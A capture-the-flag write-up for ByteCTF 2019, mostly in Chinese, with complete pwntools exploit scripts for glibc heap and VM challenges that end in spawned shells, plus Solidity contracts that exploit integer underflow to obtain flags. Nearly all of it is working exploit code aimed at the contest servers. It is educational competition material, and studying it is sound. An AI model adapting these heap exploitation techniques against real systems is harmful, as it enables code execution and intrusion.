# ByteCTF 2019 WriteUp Kn0ck                     

## PWN

## mheap | stuck |

notefive | solved |
 off by one漏洞，没有fastbin，构造overlap，首先利用unsorted bin  attack攻击global_max_fast，利用两个相同地址fastbin数组溢出攻击两次stdout造成泄露，最后一次攻击stdout  vtable，将其改为heap地址，在heap地址中提前布置好one_gadget

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from PwnContext import *
if __name__ == '__main__':
    context.terminal = ['tmux', 'split', '-h']
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()

    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)

    uu32    = lambda data   :u32(data.ljust(4, ''))
    uu64    = lambda data   :u64(data.ljust(8, ''))

    debugg = 0
    logg = 0

    ctx.binary = './notefive'

    ctx.custom_lib_dir = './glibc-all-in-one/libs/2.23-0ubuntu11_amd64/'#remote libc
    ctx.debug_remote_libc = True

    ctx.symbols = {'note':0x202060}
    #ctx.breakpoints = [0x1234, 0x5678]
    #ctx.debug()
    #ctx.start("gdb",gdbscript="set follow-fork-mode childnc")
    while True:
        try:
            if debugg:
                rs()
            else:
                ctx.remote = ('112.126.103.195', 9999)
                rs(method = 'remote')
            '''
            if (ctx.bases.libc + 0x3c67f8) & 0xffff != 0x87f8:
                ctx.close()
                continue
            '''
            if logg:
                context.log_level = 'debug'

            def choice(aid):
                sla('choice>> ',aid)
            def add(aid,asize):
                choice(1)
                sla('idx: ',aid)
                sla('size: ',asize)
            def edit(aid,acon):
                choice(2)
                sla('idx: ',aid)
                sa('content: ',acon)
            def free(aid):
                choice(3)
                sla('idx: ',aid)

            add(0,0x108)
            add(1,0x400)
            add(2,0x108)
            add(3,0x108)
            for i in range(4):
                add(4,0x400)
            add(4,0xb0)
            add(4,0x400)
            edit(4,(p64(0)+p64(0x21))*40+'n')

            edit(1,'x00'*0x3f0+p64(0x400)+'n')
            free(1)
            edit(0,'x00'*0x109)

            add(1,0x108)
            add(4,0x2e8)

            free(1)
            free(2)

            add(1,0x118)
            add(2,0x98)
            add(3,0x358)
            free(1)
            edit(2,'x00'*0x90+p64(0x1c0)+'x60')
            free(3)

            add(1,0x118)
            add(3,0x98)

            global_max_fast = 0x87f8
            write_base_offset = 0x1651
            stdout_vtable_offset = 0x17c1
            #ctx.debug()
            #raw_input()
            payload = p64(0)+p64(write_base_offset)
            payload = payload.ljust(0xa0,'x00')
            payload += p64(0)+p64(0x361)
            payload += p64(0)+p16(global_max_fast-0x10)
            edit(4,payload+'n')
            add(0,0x358)
            free(2)

            sl(2)
            sleep(0.1)
            sl(4)
            sleep(0.1)
            sl(p64(0)+p64(write_base_offset-0x20))
            sleep(0.1)

            sl(3)
            sleep(0.1)
            sl(3)
            data = ru('x7f',drop=False)
            libc_base = uu64(data[-6:])
            ru('exit')
            libc_base -= 0x3c56a3
            log.success("libc_base = %s"%hex(libc_base))
            libc = ctx.libc
            one = libc_base + 0xf1147
            edit(0,p64(one)*8+'n') #fake table+0x38

            edit(4,'x00'*0xa8+p64(stdout_vtable_offset)+'n')
            free(0)

            #ctx.debug()
            irt()
        except KeyboardInterrupt:
            exit()
        except EOFError:
            continue
        except:
            if ctx.io:
                ctx.close()
```

###  vip | solved |

首先泄露heap和libc地址，然后爆破修改tcache的fd到0x4040e0，然后直接攻击free hook即可。

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from PwnContext import *
if __name__ == '__main__':
    context.terminal = ['tmux', 'split', '-h']
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()

    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)

    uu32    = lambda data   :u32(data.ljust(4, ''))
    uu64    = lambda data   :u64(data.ljust(8, ''))

    debugg = 0
    logg = 0

    ctx.binary = './vip'

    ctx.custom_lib_dir = './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/'#remote libc
    ctx.debug_remote_libc = True

    ctx.symbols = {'note':0x404100}
    #ctx.breakpoints = [0x1234, 0x5678]
    #ctx.debug()
    #ctx.start("gdb",gdbscript="set follow-fork-mode childnc")

    if debugg:
        rs()
    else:
        ctx.remote = ('112.126.103.14', 9999)
        rs(method = 'remote')

    if logg:
        context.log_level = 'debug'

    def choice(idx,aid):
        sla('choice: ',aid)
        sla('Index: ',idx)
    def add(aid):
        choice(aid,1)
    def show(aid):
        choice(aid,2)
    def free(aid):
        choice(aid,3)
    def edit(aid,asize,acon=None):
        choice(aid,4)
        sla('Size: ',asize)
        ru('Content: ')
        if acon != None:
            s(acon)
    def triger(aid):
        choice(aid,4)
        sla('Size: ','0'*0x400)

    for i in range(10):
        add(i)
    for i in range(7):
        free(i)
    add(6)
    show(6)
    heap = uu64(ru('n'))
    log.success("heap = %s"%hex(heap))
    if(len(p32(heap).replace('x00','')) > 3):
        log.error("can't exploit")
        ctx.close()
        exit()
    free(7)
    free(8)
    triger(9)
    for i in range(7):
        add(i)
    add(7)
    show(7)
    libc_base = uu64(r(6)) - 0x3ebd50 + 0x60
    log.success("libc_base = %s"%hex(libc_base))
    add(8)

    free(0)
    free(1)
    while True:
        edit(2,0x63)
        show(2)
        data = ru('Done!')[:-1]
        #print(hex(len(data)))
        if len(data) != 0x63:
            continue
        data = uu32(data[-3:])
        log.success("data = %s"%hex(data))
        if (data >> 16) == 0x40:
            break

    while True:
        edit(2,0x62)
        show(2)
        data = ru('Done!')[:-1]
        #print(hex(len(data)))
        if len(data) != 0x63:
            continue
        data = uu32(data[-3:])
        log.success("data = %s"%hex(data))
        if (data >> 8) == 0x4040:
            break

    while True:
        edit(2,0x61)
        show(2)
        data = ru('Done!')[:-1]
        #print(hex(len(data)))
        if len(data) != 0x63:
            continue
        data = uu32(data[-3:])
        log.success("data = %s"%hex(data))
        if data == 0x4040E0:
            break
    add(1)
    add(0)
    edit(0,1)

    free(2)
    free(3)

    libc = ctx.libc 
    free_hook = libc_base + libc.symbols['__free_hook']
    system = libc_base + libc.symbols['system']
    payload = 'x00'*0x60
    payload += p64(free_hook)
    edit(4,len(payload),payload)

    add(3)
    edit(3,8,'/bin/shx00')
    add(2)
    edit(2,8,p64(system))
    #free(3)

    #ctx.debug()
    irt()
```

###  mulnote | solved |

水题，free之后有10秒才清空堆指针，乱搞

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from PwnContext import *
if __name__ == '__main__':
    context.terminal = ['tmux', 'split', '-h']
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()

    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)

    uu32    = lambda data   :u32(data.ljust(4, ''))
    uu64    = lambda data   :u64(data.ljust(8, ''))

    debugg = 0
    logg = 0

    ctx.binary = './mulnote'

    ctx.custom_lib_dir = './glibc-all-in-one/libs/2.23-0ubuntu11_amd64/'#remote libc
    ctx.debug_remote_libc = True

    ctx.symbols = {'note':0x202020}
    #ctx.breakpoints = [0x1234, 0x5678]
    #ctx.debug()
    #ctx.start("gdb",gdbscript="set follow-fork-mode childnc")

    if debugg:
        rs()
    else:
        ctx.remote = ('112.126.101.96', 9999)
        rs(method = 'remote')

    if logg:
        context.log_level = 'debug'

    def choice(achar):
        sla('>',achar)
    def add(asize,acon):
        choice('C')
        sla('size>',asize)
        sa('note>',acon)
    def show():
        choice('S')
    def free(aid):
        choice('R')
        sla('index>',aid)
    def edit(aid,acon):
        choice('E')
        sla('index>',aid)
        sa('new note>',acon)

    add(0x100,'0')
    add(0x10,'1')
    free(0)
    add(0x100,'A')
    show()

    ru('[0]:n')
    libc_base = uu64(r(6)) - 0x3c4b41
    log.success("libc_base = %s"%hex(libc_base))

    add(0x60,'3')
    add(0x60,'4')
    free(3)
    free(4)
    free(3)

    libc = ctx.libc
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    one = libc_base + 0x4526a

    add(0x60,p64(malloc_hook-0x23)) #5
    add(0x60,'6')
    add(0x60,'7')
    add(0x60,'x00'*0x13+p64(one)) #8
    sla('>','C')
    sla('size>',1)

    #ctx.debug()
    irt()
```

###  ezarch | solved |

题目stack大小为4096，但是判断ebp时使用memory size来判断，远大于4096，造成栈溢出，修改bss上stack地址，造成任意地址读写，将malloc改成one gadget

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from PwnContext import *
if __name__ == '__main__':
    context.terminal = ['tmux', 'split', '-h']
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()

    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)

    uu32    = lambda data   :u32(data.ljust(4, ''))
    uu64    = lambda data   :u64(data.ljust(8, ''))

    debugg = 0
    logg = 0

    ctx.binary = './ezarch'

    ctx.custom_lib_dir = './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/'#remote libc
    ctx.debug_remote_libc = True

    ctx.symbols = {'stack':0x2020C0,'mem':0x202078}
    ctx.breakpoints = [0x189F,0x152F,0xEC0]
    #ctx.debug()
    #ctx.start("gdb",gdbscript="set follow-fork-mode childnc")

    if debugg:
        rs()
    else:
        ctx.remote = ('112.126.102.73', 9999)
        rs(method = 'remote')

    if logg:
        context.log_level = 'debug'

    def setmem(memsize,mem,eip,esp,ebp):
        sla('[E]xitn>','M')
        sla('Memory size>',memsize)
        sla('Inited size>',len(mem))
        sa(')n',mem)
        sla('eip>',eip)
        sla('esp>',esp)
        sla('ebp>',ebp)
    def set_reg(aid,num):
        return 'x03'+'x10'+p32(aid)+p32(num)
    def set_ebp(num):
        return 'x03'+'x10'+p32(0x11)+p32(num)
    def set_esp(num):
        return 'x03'+'x10'+p32(0x10)+p32(num)
    def write_ebp(num):
        return 'x03'+'x12'+p32(0x11)+p32(num)
    def read_ebp(regid):
        return 'x03'+'x20'+p32(regid)+p32(0x11)
    def sub_reg(regid,num):
        return 'x02'+'x10'+p32(regid)+p32(num)
    def mov_ebp_reg(regid):
        return 'x03'+'x00'+p32(0x11)+p32(regid)
    def mov_ebpP_reg(regid):
        return 'x03'+'x02'+p32(0x11)+p32(regid)

    payload = ''
    payload += set_ebp(0x1008)
    payload += read_ebp(0) #reg0
    payload += sub_reg(0,0x78) #got malloc
    payload += mov_ebpP_reg(0)
    payload += set_ebp(0)
    payload += read_ebp(1) #reg1
    payload += sub_reg(1,0x47d4e)
    payload += mov_ebpP_reg(1)
    setmem(0x2000,payload,0,0,0)
    sla('>','R')

    sla('>','M')
    sla('size>',1)
    #ctx.debug()
    irt()
```

 

## MISC

###  betgame | solved |

```python
    和题目交互30次，类似石头剪刀布，要求全胜，每次开始题目会宣布自己下回合出什么，实际出的会相对有个偏移，然后测试发现偏移是固定的，这样其实每次交互都是可预测的，脚本如下：
from pwn import *

order = []
#order = [0, 2, 1, 0, 2, 1, 0, 2, 1, 0, 2, 1, 0, 2, 1, 0, 2, 1, 0, 2, 1, 0, 2, 1, 0, 2, 1, 0, 2, 1]
bet = ['j', 's', 'b']


def trybet():
    t = remote('112.125.25.81', 9999)
    for i in range(len(order)):
        start = t.recvline()
        you = start[-2:-1]
        me = bet[(stoi(you)+order[i])%3]
        t.sendline(me)
        check = t.recvline()
        print check
    try :
        print t.recvline()
    except EOFError:
        pass
    t.close()
    return check

def stoi(a):
    if a == 'j':
        return 0
    if a == 's':
        return 1
    if a == 'b':
        return 2


for i in range(30):
    for j in range(3):
        order.append(j)
        check = trybet()
        if 'you' in check:
            print order
            break
        else:
            order.pop(-1)
```

###  bet | solved |

```python
    主要solidity好多语法需要摸索，题目本身不难，想办法让数据下溢就好了，另外调用getflag函数卡了好久，一个是目标合约会往发送合约转钱，要设个可收钱的反馈函数，另一个间接调用不懂为啥总是掉参数,贴下getflag的合约：
pragma solidity ^0.4.23;
contract hack {
address target = 0x30D0a604D8c90064a0a3cA4BeEEA177EfF3e9bCd;
    constructor()public  payable   {
           target = 0x30D0a604D8c90064a0a3cA4BeEEA177EfF3e9bCd;
    }
    event log(bytes4);
    function () payable {
      emit  log(1);
    }

    function setvar1(uint aa) public returns (bool) {

        bytes4 method = 0xf98b23c9;
       return  target.call(method,aa);
    }

    function mapping3(address _arg0) public view {
         bytes4 method = 0x6956604e;
         target.call(method,_arg0);
}

     function setplus2(uint aa) public returns (bool) {

        bytes4 method = 0xad17b493;
       return  target.call(method,aa);
    }

    function guessvar1(uint aa) public returns (bool) {

        bytes4 method = 0x1727bb94;
       return  target.call(method,aa);
    }
    function getprofit() public {
        bytes4 method = 0x66d16cc3;
        target.call(method);
    }

    function Bet() public returns (bool) {
        bytes4 methodId = bytes4(keccak256("Bet()"));
       return  target.call(methodId);
    }

    function flag(string email) public returns (bool) {
        bytes4 methodId = bytes4(keccak256("payforflag(string)"));
        log(methodId);
        //bytes4 methodId = 0x6bc344bc;
       //return  target.call(methodId,email);
    return  target.call(0x6bc344bc,0x20,0x20,email);

    }
    function getflag(string email) public returns (bool) {
        Bet();
        flag(email);
    }


    function hackk() public{
        getprofit();
        plus();
         guessvar1(122);
         setplus2(1);
    }

    function plus()public {
        Bet();
        setvar1(123);
        guessvar1(123);
    }
    function kill() {

      selfdestruct(0xc6420e40E0e1e21b5480233E51E11c626a011ba0);
    }

}
```

###  jigsaw | solved |

```
    题目给了一堆图片，拼起来就是flag，是个月厨
```

hf_ | solved |
 题目和上题类似，也是想办法下溢数据，合约如下：

```python
pragma solidity ^0.4.23;
contract hackhf {
address target = 0x62f1173e0fb4d481114d389dc8e0dea65e942735;
    constructor()public  payable   {
           target = 0x62f1173e0fb4d481114d389dc8e0dea65e942735;
    }
    event log(bytes4);
    function () payable {
      emit  log(1);
    }


    function trans(address aa,uint bb) public returns (bool) {

        bytes4 method = 0x0f77e47d;
       return  target.call(method,aa,bb);
    }
    function setvar1(address aa) public payable  {
        bytes4 method = 0xbf1912bc;
        target.call.value(2000000000000000000 wei)(method,aa);
    }
    function hack(address bb,string email,uint cc) public payable{
        getprofit();
        address aa = address(this);
        setvar1(aa);
        trans(bb,cc);
        flag(email);
    }

    function getprofit() public {
        bytes4 method = 0x66d16cc3;
        target.call(method);
    }



    function flag(string email) public returns (bool) {
        bytes4 methodId = bytes4(keccak256("payforflag(string)"));
        log(methodId);
        //bytes4 methodId = 0x6bc344bc;
       //return  target.call(methodId,email);
    return  target.call(0x6bc344bc,0x20,0x20,email);

    }



    function kill() {

      selfdestruct(0xc6420e40E0e1e21b5480233E51E11c626a011ba0);
    }

}
```